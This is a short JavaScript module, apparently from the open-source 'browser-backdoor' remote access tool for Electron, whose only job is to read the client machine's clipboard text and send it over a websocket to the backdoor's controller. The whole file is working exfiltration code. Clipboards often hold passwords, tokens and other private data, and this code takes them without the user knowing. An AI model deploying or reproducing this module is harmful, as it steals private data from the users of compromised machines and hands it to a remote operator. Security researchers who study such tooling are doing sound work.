/**
 * @file readClipboard Module
 * @summary Reads the client system's clipboard.
 * @author Carleton Stuberg
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

electron = require('electron');

/**
 * @return {String} Text in clipboard
 */
ws.send(electron.clipboard.readText());
